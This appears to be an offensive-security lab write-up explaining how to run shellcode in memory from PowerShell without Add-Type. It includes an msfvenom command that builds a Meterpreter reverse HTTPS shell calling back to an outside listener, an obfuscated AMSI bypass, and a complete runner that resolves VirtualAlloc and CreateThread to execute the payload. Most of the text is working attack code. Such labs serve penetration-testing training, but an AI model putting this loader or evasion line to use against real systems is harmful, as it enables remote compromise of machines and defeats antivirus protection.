This lab runs shellcode from PowerShell without using `Add-Type`. Instead, it locates Win32 functions through `Microsoft.Win32.UnsafeNativeMethods`, builds delegate types at runtime, and executes the payload from allocated memory. This avoids the `.cs` and `.dll` files that `Add-Type` can create on disk.

## Approach

* The script does not use `Add-Type`, so it avoids the C# source and assembly artifacts that method can generate.

* `UnsafeNativeMethods` provides access to `GetProcAddress` and `GetModuleHandle`. The script uses them to resolve the remaining Win32 functions at runtime.

## Generate the payload

Use Metasploit's `msfvenom` to generate a Meterpreter reverse HTTPS payload in PowerShell format:

```bash
msfvenom -p windows/meterpreter/reverse_https LHOST=192.168.119.120 LPORT=443 EXITFUNC=thread -f ps1
```

Place the generated byte array in the runner shown below.

## Shellcode runner

The `run.ps1` script has five parts.

### 1\. Bypass AMSI

The first line modifies a static field in the `System.Management.Automation` assembly to bypass AMSI (Antimalware Scan Interface).

```csharp
[Ref].Assembly.GetType('System.Management.Automation.'+$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBtAHMAaQBVAHQAaQBsAHMA')))).GetField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('YQBtAHMAaQBJAG4AaQB0AEYAYQBpAGwAZQBkAA=='))),'NonPublic,Static').SetValue($null,$true)
```

### 2\. Define helper functions

Two helper functions resolve unmanaged functions and build callable delegates.

#### `LookupFunc`

`LookupFunc` returns the address of a named Win32 API function. It uses the loaded `System.dll` assembly to reach `GetProcAddress` and `GetModuleHandle`.

```csharp
function LookupFunc {
    Param ($moduleName, $functionName)
    $assem = ([AppDomain]::CurrentDomain.GetAssemblies() |
              Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].Equals('System.dll') }).GetType('Microsoft.Win32.UnsafeNativeMethods')
    $tmp = @()
    $assem.GetMethods() | ForEach-Object {
        If ($_.Name -eq "GetProcAddress") {
            $tmp += $_
        }
    }
    return $tmp[0].Invoke($null, @(
        ($assem.GetMethod('GetModuleHandle')).Invoke($null, @($moduleName)),
        $functionName
    ))
}
```

#### `getDelegateType`

`getDelegateType` creates a delegate type with the required argument and return types, which lets PowerShell call the resolved function pointer.

```csharp
function getDelegateType {
    Param (
        [Parameter(Position = 0, Mandatory = $True)] [Type[]] $func,
        [Parameter(Position = 1)] [Type] $delType = [Void]
    )
    $type = [AppDomain]::CurrentDomain.DefineDynamicAssembly((New-Object System.Reflection.AssemblyName('ReflectedDelegate')), [System.Reflection.Emit.AssemblyBuilderAccess]::Run).DefineDynamicModule('InMemoryModule', $false).DefineType('MyDelegateType', 'Class, Public, Sealed, AnsiClass, AutoClass', [System.MulticastDelegate])
    $type.DefineConstructor('RTSpecialName, HideBySig, Public', [System.Reflection.CallingConventions]::Standard, $func).SetImplementationFlags('Runtime, Managed')
    $type.DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', $delType, $func).SetImplementationFlags('Runtime, Managed')
    return $type.CreateType()
}
```

### 3\. Allocate memory and copy the payload

The script resolves `VirtualAlloc`, allocates executable memory, and copies the shellcode into that region.

```csharp
$lpMem = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((LookupFunc kernel32.dll VirtualAlloc), (getDelegateType @([IntPtr], [UInt32], [UInt32], [UInt32]) ([IntPtr]))).Invoke([IntPtr]::Zero, 0x1000, 0x3000, 0x40)

[Byte[]] $buf = # Shellcode goes here

[System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $lpMem, $buf.length)
```

### 4\. Start the thread

It then resolves `CreateThread` and starts a thread at the allocated address.

```csharp
$hThread = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((LookupFunc kernel32.dll CreateThread), (getDelegateType @([IntPtr], [UInt32], [IntPtr], [IntPtr], [UInt32], [IntPtr]) ([IntPtr]))).Invoke([IntPtr]::Zero,0,$lpMem,[IntPtr]::Zero,0,[IntPtr]::Zero)
```

### 5\. Wait for completion

`WaitForSingleObject` keeps the PowerShell process alive while the thread runs.

```csharp
[System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((LookupFunc kernel32.dll WaitForSingleObject), (getDelegateType @([IntPtr], [Int32]) ([Int]))).Invoke($hThread, 0xFFFFFFFF)
```
